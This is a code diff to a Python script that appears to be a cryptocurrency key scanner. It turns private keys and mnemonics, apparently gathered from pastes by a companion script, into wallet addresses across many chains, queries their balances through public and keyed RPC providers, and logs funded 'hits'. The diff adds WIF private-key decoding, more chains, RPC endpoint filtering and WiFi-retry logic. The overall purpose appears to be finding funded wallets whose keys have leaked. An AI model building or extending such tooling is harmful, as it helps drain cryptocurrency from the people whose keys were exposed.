@@ -46,6 +46,65 @@ except ImportError:
     raise SystemExit("[!] mnemonic is required: pip3 install mnemonic")
 
 # ---------------------------------------------------------------------------
+# WiFi resilience helpers
+# ---------------------------------------------------------------------------
+_WIFI_WAIT_INTERVAL = 30  # seconds between connectivity checks
+_WIFI_WAIT_TIMEOUT = None  # None = wait forever; set to seconds for a limit
+
+def is_wifi_connected(timeout: float = 5.0) -> bool:
+    """Return True if the device has working internet connectivity."""
+    try:
+        requests.head(
+            "https://www.google.com",
+            timeout=timeout,
+            headers={"User-Agent": "RepoHere1-Termux/2.0"},
+        )
+        return True
+    except Exception:
+        return False
+
+
+def wait_for_wifi(
+    check_interval: float = _WIFI_WAIT_INTERVAL,
+    max_wait: float | None = _WIFI_WAIT_TIMEOUT,
+) -> None:
+    """Block until WiFi/internet connectivity is restored.
+
+    Prints a log message every *check_interval* seconds so the user knows
+    the scanner is still alive and waiting rather than crashed.
+    """
+    logger.info("[wifi] No connectivity — waiting for WiFi to return...")
+    start = time.time()
+    while True:
+        if is_wifi_connected(timeout=5):
+            logger.info("[wifi] Connectivity restored — resuming.")
+            return
+        if max_wait is not None and (time.time() - start) >= max_wait:
+            logger.warning("[wifi] Wait timed out after %.0fs — proceeding anyway.", max_wait)
+            return
+        time.sleep(check_interval)
+
+
+def _is_connectivity_error(exc: BaseException) -> bool:
+    """Return True if *exc* looks like a lost-WiFi / no-network error."""
+    if isinstance(exc, (requests.ConnectionError, requests.Timeout)):
+        return True
+    msg = str(exc).lower()
+    keywords = (
+        "connection refused",
+        "connection reset",
+        "connection aborted",
+        "name or service not known",
+        "no address associated",
+        "network is unreachable",
+        "timed out",
+        "temporary failure in name resolution",
+        "err_connection",
+    )
+    return any(kw in msg for kw in keywords)
+
+
+# ---------------------------------------------------------------------------
 # Config
 # ---------------------------------------------------------------------------
 CHECK_INTERVAL = 5
@@ -64,19 +123,49 @@ BALANCE_HIT_FILE = os.path.join(APP_DIR, "balances_hit.jsonl")
 # Optional API keys read from env
 ETHERSCAN_KEY = os.environ.get("ETHERSCAN_API_KEY", "")
 ALCHEMY_KEY = os.environ.get("ALCHEMY_API_KEY", "")
+ANKR_API_KEY = os.environ.get("ANKR_API_KEY", "")
 
-# Load user-supplied RPC endpoints discovered by paste_box.py
+# Load user-supplied RPC endpoints discovered by paste_box.py.
+# We dedupe them and drop known-broken / key-required placeholders so a noisy
+# rpc_endpoints.jsonl file cannot drown out the curated public providers.
 USER_RPC_ENDPOINTS: Dict[str, List[str]] = {"eth": [], "sol": [], "btc": [], "matic": [], "avax": [], "bnb": []}
 _RPC_FILE = os.path.join(APP_DIR, "rpc_endpoints.jsonl")
+_BLOCKED_RPC_PARTS = (
+    "YOUR_ALCHEMY_KEY",
+    "llamarpc.com",
+    "meowrpc.com",
+    "cloudflare-eth.com",
+    "bsc-dataseed.binance.org",
+    "polygon-rpc.com",
+    "avalanche.public-rpc.com",
+    "bscrpc.com",
+)
+
+def _is_keyless_ankr(url: str) -> bool:
+    """Keyless Ankr URLs require an API key and just waste time."""
+    if "rpc.ankr.com" not in url.lower():
+        return False
+    # A keyed URL looks like .../eth/<64-char-key>. A keyless URL ends with the chain name.
+    last = url.rstrip("/").rsplit("/", 1)[-1]
+    return len(last) != 64
+
 if os.path.exists(_RPC_FILE):
     try:
+        seen_urls: set = set()
         with open(_RPC_FILE, "r", encoding="utf-8") as f:
             for line in f:
                 line = line.strip()
                 if not line:
                     continue
                 rec = json.loads(line)
-                url = rec.get("url", "")
+                url = rec.get("url", "").strip().rstrip("/")
+                if not url or url in seen_urls:
+                    continue
+                if any(part.lower() in url.lower() for part in _BLOCKED_RPC_PARTS):
+                    continue
+                if _is_keyless_ankr(url):
+                    continue
+                seen_urls.add(url)
                 low = url.lower()
                 if "solana" in low or "sol" in low:
                     USER_RPC_ENDPOINTS["sol"].append(url)
@@ -291,6 +380,19 @@ def wif_to_btc_address(wif: str) -> Optional[str]:
         logger.debug("WIF derivation failed: %s", e)
         return None
 
+
+def wif_to_priv_bytes(wif: str) -> Optional[bytes]:
+    """Decode WIF -> 32-byte private key."""
+    try:
+        decoded = base58.b58decode_check(wif)
+        if len(decoded) not in (33, 34):
+            return None
+        return decoded[1:33]
+    except Exception as e:
+        logger.debug("WIF decode failed: %s", e)
+        return None
+
+
 def hex_to_eth_address(hex_key: str) -> Optional[str]:
     """64-char hex private key -> checksummed Ethereum address."""
     try:
@@ -371,6 +473,8 @@ def priv_to_addresses(priv: bytes) -> Dict[str, str]:
             addresses["matic"] = eth_addr
             addresses["avax"] = eth_addr
             addresses["bnb"] = eth_addr
+            addresses["base"] = eth_addr
+            addresses["monad"] = eth_addr
         sol_addr = hex_to_sol_address(priv.hex())
         if sol_addr:
             addresses["sol"] = sol_addr
@@ -417,8 +521,11 @@ def throttle_cpu_ram(sleep_base: float = 0.05):
     time.sleep(sleep_base)
     mem = available_memory_mb()
     if 0 < mem < 256:
+        logger.info("Throttling: low memory (%.1f MB available)", mem)
         gc.collect()
         time.sleep(sleep_base * 4)
+    elif mem >= 256:
+        logger.debug("Memory OK: %.1f MB available", mem)
 
 
 # ---------------------------------------------------------------------------
@@ -431,7 +538,10 @@ def _resp_text(r: requests.Response) -> str:
     return r.text
 
 def _json_rpc_result(r: requests.Response) -> Any:
-    return r.json().get("result")
+    data = r.json()
+    if isinstance(data, dict) and "error" in data:
+        raise RuntimeError(f"RPC error: {data['error']}")
+    return data.get("result")
 
 def _evm_balance_wei(data: Any) -> float:
     """Parse hex wei string or integer to ETH."""
@@ -515,54 +625,47 @@ BALANCE_PROVIDERS: Dict[str, List[Tuple[str, Any, Any, Optional[dict]]]] = {
         ("https://api.polygonscan.com/api?module=account&action=balance&address={addr}&tag=latest&apikey={key}", _resp_json,
          lambda d: int(d.get("result", 0)) / 1e18, None),
     ],
+    "xrp": [
+        ("https://api.xrpscan.com/api/v1/account/{addr}", _resp_json, lambda d: float(d.get("xrpBalance", 0) or 0), None),
+    ],
     "sol": [],
+    "base": [],
+    "monad": [],
 }
 
-# Alchemy providers (if key is available)
-if ALCHEMY_KEY:
-    BALANCE_PROVIDERS["eth"].insert(0, (
-        f"https://eth-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}",
-        _json_rpc_result,
-        _evm_balance_wei,
-        _rpc_payload("{addr}", "eth"),
-    ))
-    BALANCE_PROVIDERS["sol"].append((
-        f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}",
-        _json_rpc_result,
-        _sol_balance_lamports,
-        _rpc_payload("{addr}", "sol"),
-    ))
-
-# Public RPC endpoints (free, rate-limited, no key required)
+# Public RPC endpoints (curated, free, no API key required)
 PUBLIC_RPCS = {
     "eth": [
-        "https://eth.llamarpc.com",
-        "https://rpc.ankr.com/eth",
-        "https://cloudflare-eth.com",
         "https://ethereum.publicnode.com",
         "https://eth.drpc.org",
+        "https://rpc.mevblocker.io",
+        "https://eth-mainnet.public.blastapi.io",
+        "https://eth.rpc.blxrbdn.com",
+        "https://1rpc.io/eth",
     ],
     "matic": [
-        "https://polygon.llamarpc.com",
-        "https://rpc.ankr.com/polygon",
-        "https://polygon-rpc.com",
         "https://polygon.publicnode.com",
+        "https://polygon.drpc.org",
     ],
     "avax": [
-        "https://avax.meowrpc.com",
-        "https://rpc.ankr.com/avalanche",
-        "https://avalanche.public-rpc.com",
         "https://avalanche.publicnode.com",
+        "https://avalanche.drpc.org",
+        "https://api.avax.network/ext/bc/C/rpc",
+        "https://1rpc.io/avax/c",
     ],
     "bnb": [
-        "https://bsc-dataseed.binance.org",
-        "https://rpc.ankr.com/bsc",
         "https://bsc.publicnode.com",
+        "https://binance.nodereal.io",
+        "https://bsc-mainnet.public.blastapi.io",
     ],
     "sol": [
         "https://api.mainnet-beta.solana.com",
         "https://solana.publicnode.com",
-        "https://rpc.ankr.com/solana",
+    ],
+    "base": [
+        "https://base.publicnode.com",
+        "https://base.drpc.org",
+        "https://mainnet.base.org",
     ],
 }
 
@@ -573,14 +676,54 @@ for chain, urls in PUBLIC_RPCS.items():
             url, _json_rpc_result, extractor, _rpc_payload("{addr}", chain)
         ))
 
-# Append user-discovered RPC endpoints so they are tried first
+# Insert user-discovered RPC endpoints near the front so they are used in
+# harmony with the public fallbacks.  Broken / placeholder / duplicate URLs
+# have already been filtered out when USER_RPC_ENDPOINTS was loaded.
 for chain in USER_RPC_ENDPOINTS:
     if chain == "btc":
         continue
     extractor = _sol_balance_lamports if chain == "sol" else _evm_balance_wei
+    existing_urls = {p[0] for p in BALANCE_PROVIDERS.get(chain, [])}
     for url in USER_RPC_ENDPOINTS[chain]:
+        if url in existing_urls:
+            continue
         BALANCE_PROVIDERS.setdefault(chain, []).insert(0, (
             url, _json_rpc_result, extractor, _rpc_payload("{addr}", chain)
+        ))
+
+# Ankr providers (if key is available) - tried before public nodes.
+if ANKR_API_KEY:
+    _ANKR_CHAIN_MAP = {
+        "eth": "eth",
+        "bsc": "bsc",
+        "matic": "polygon",
+        "avax": "avalanche",
+        "sol": "solana",
+        "base": "base",
+        "monad": "monad_mainnet",
+    }
+    for chain, ankr_name in _ANKR_CHAIN_MAP.items():
+        url = f"https://rpc.ankr.com/{ankr_name}/{ANKR_API_KEY}"
+        existing_urls = {p[0] for p in BALANCE_PROVIDERS.get(chain, [])}
+        if url in existing_urls:
+            continue
+        extractor = _sol_balance_lamports if chain == "sol" else _evm_balance_wei
+        BALANCE_PROVIDERS.setdefault(chain, []).insert(0, (
+            url, _json_rpc_result, extractor, _rpc_payload("{addr}", chain)
+        ))
+
+# Alchemy providers (if key is available) - always first so the paid key is
+# preferred over public nodes and any duplicate discovered URL.
+if ALCHEMY_KEY:
+    alchemy_eth = f"https://eth-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}"
+    if alchemy_eth not in {p[0] for p in BALANCE_PROVIDERS.get("eth", [])}:
+        BALANCE_PROVIDERS["eth"].insert(0, (
+            alchemy_eth, _json_rpc_result, _evm_balance_wei, _rpc_payload("{addr}", "eth")
+        ))
+    alchemy_sol = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}"
+    if alchemy_sol not in {p[0] for p in BALANCE_PROVIDERS.get("sol", [])}:
+        BALANCE_PROVIDERS["sol"].insert(0, (
+            alchemy_sol, _json_rpc_result, _sol_balance_lamports, _rpc_payload("{addr}", "sol")
         ))
 
 # ---------------------------------------------------------------------------
@@ -655,7 +798,6 @@ def retry(max_attempts: int = 3, base_delay: float = 1.0, backoff: float = 2.0):
         return wrapper
     return decorator
 
-@retry(max_attempts=3, base_delay=1.0)
 def fetch_balance(chain: str, address: str) -> Optional[float]:
     providers = BALANCE_PROVIDERS.get(chain, [])
     headers = {"User-Agent": "RepoHere1-Termux/2.0", "Content-Type": "application/json"}
@@ -669,9 +811,9 @@ def fetch_balance(chain: str, address: str) -> Optional[float]:
         try:
             if payload_template is not None:
                 payload = json.loads(json.dumps(payload_template).replace("{addr}", address))
-                r = requests.post(url, json=payload, timeout=15, headers=headers)
+                r = requests.post(url, json=payload, timeout=10, headers=headers)
             else:
-                r = requests.get(url, timeout=15, headers={"User-Agent": "RepoHere1-Termux/2.0"})
+                r = requests.get(url, timeout=10, headers={"User-Agent": "RepoHere1-Termux/2.0"})
             r.raise_for_status()
             data = parser(r)
             return float(extractor(data))
@@ -681,6 +823,11 @@ def fetch_balance(chain: str, address: str) -> Optional[float]:
             else:
                 logger.debug("HTTP error %s for %s/%s: %s", r.status_code, chain, address, e)
         except Exception as e:
+            if _is_connectivity_error(e):
+                logger.warning("[wifi] Connectivity error on %s/%s — waiting for WiFi...", chain, address)
+                wait_for_wifi()
+                logger.info("[wifi] Retrying %s/%s after connectivity restored.", chain, address)
+                continue  # retry this provider with fresh connection
             logger.debug("Provider error %s/%s: %s", chain, address, e)
     return None
 
@@ -688,8 +835,14 @@ def get_balance(chain: str, address: str) -> Dict[str, Any]:
     key = chain + ":" + address
     with BALANCE_CACHE_LOCK:
         cached = BALANCE_CACHE.get(key)
-    if cached and (time.time() - cached.get("ts", 0)) < 3600:
-        return cached
+    if cached:
+        age = time.time() - cached.get("ts", 0)
+        # Successful balances are valid for one hour.
+        if cached.get("balance") is not None and age < 3600:
+            return cached
+        # Failed checks are retried after one minute instead of staying ERROR.
+        if cached.get("balance") is None and age < 60:
+            return cached
     balance = fetch_balance(chain, address)
     rec = {
         "chain": chain,
